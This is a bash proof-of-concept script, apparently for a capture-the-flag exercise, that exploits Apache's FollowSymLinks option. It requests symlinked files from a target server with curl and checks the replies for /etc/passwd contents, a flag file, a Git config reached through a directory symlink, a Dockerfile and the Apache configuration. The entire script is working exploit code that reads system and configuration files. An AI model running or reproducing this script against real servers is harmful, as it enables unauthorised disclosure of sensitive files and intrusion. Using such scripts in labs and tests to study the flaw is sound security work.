#!/bin/bash
# Comprehensive POC: Symlink-Based File Access Exploitation via Apache FollowSymLinks
# Demonstrates multiple exploitation vectors including sensitive file access and directory traversal

TARGET_URL="${1:-http://localhost:8080}"
WEB_ROOT="${2:-./}"

echo "[*] Comprehensive Symlink Exploitation POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Counter for successful exploits
VULNS_FOUND=0

# Test 1: System file access (/etc/passwd)
echo "[Test 1] Accessing system files through symlinks"
PASSWD_LINK="$WEB_ROOT/passwd_link.txt"
if [ -L "$PASSWD_LINK" ]; then
    RESPONSE=$(curl -s "$TARGET_URL/passwd_link.txt" 2>&1)
    if echo "$RESPONSE" | grep -q "root:"; then
        echo "[✓] VULNERABLE: /etc/passwd accessible through symlink"
        ((VULNS_FOUND++))
    fi
fi

# Test 2: Accessing FLAG.txt
echo "[Test 2] Accessing FLAG.txt through symlinks"
FLAG_LINK="$WEB_ROOT/FLAG.txt"
if [ -L "$FLAG_LINK" ]; then
    RESPONSE=$(curl -s "$TARGET_URL/FLAG.txt" 2>&1)
    if [ ! -z "$RESPONSE" ] && ! echo "$RESPONSE" | grep -q "Error\|404"; then
        echo "[✓] VULNERABLE: FLAG.txt accessible: $RESPONSE"
        ((VULNS_FOUND++))
    fi
fi

# Test 3: Symlink chains (symlink to symlink)
echo "[Test 3] Testing symlink chains"
CHAIN_LINK="$WEB_ROOT/chain_link.txt"
if [ -L "$CHAIN_LINK" ]; then
    RESPONSE=$(curl -s "$TARGET_URL/chain_link.txt" 2>&1)
    if echo "$RESPONSE" | grep -q "root:"; then
        echo "[✓] VULNERABLE: Symlink chains work (multi-level traversal)"
        ((VULNS_FOUND++))
    fi
fi

# Test 4: Directory symlinks
echo "[Test 4] Testing directory symlinks"
REPO_LINK="$WEB_ROOT/repo_link"
if [ -L "$REPO_LINK" ]; then
    RESPONSE=$(curl -s "$TARGET_URL/repo_link/.git/config" 2>&1)
    if echo "$RESPONSE" | grep -q "remote\|branch"; then
        echo "[✓] VULNERABLE: Git repository accessible through symlink directory"
        ((VULNS_FOUND++))
    fi
fi

# Test 5: Sensitive configuration files
echo "[Test 5] Testing configuration file access"
DOCKER_LINK="$WEB_ROOT/dockerfile.txt"
if [ -L "$DOCKER_LINK" ]; then
    RESPONSE=$(curl -s "$TARGET_URL/dockerfile.txt" 2>&1)
    if echo "$RESPONSE" | grep -q "FROM\|ARG"; then
        echo "[✓] VULNERABLE: Dockerfile accessible through symlink"
        ((VULNS_FOUND++))
    fi
fi

# Test 6: Apache configuration access
echo "[Test 6] Testing Apache config access"
APACHE_LINK="$WEB_ROOT/apache_config.txt"
if [ -L "$APACHE_LINK" ]; then
    RESPONSE=$(curl -s "$TARGET_URL/apache_config.txt" 2>&1)
    if echo "$RESPONSE" | grep -q "FollowSymLinks\|Options"; then
        echo "[✓] VULNERABLE: Apache configuration accessible through symlink"
        ((VULNS_FOUND++))
    fi
fi

# Summary
echo ""
echo "[*] Exploitation Summary"
echo "[*] Total vulnerabilities confirmed: $VULNS_FOUND"

if [ $VULNS_FOUND -ge 3 ]; then
    echo "[✓] CRITICAL: Multiple exploitation vectors confirmed"
    exit 0
else
    echo "[-] Insufficient vulnerabilities confirmed"
    exit 1
fi
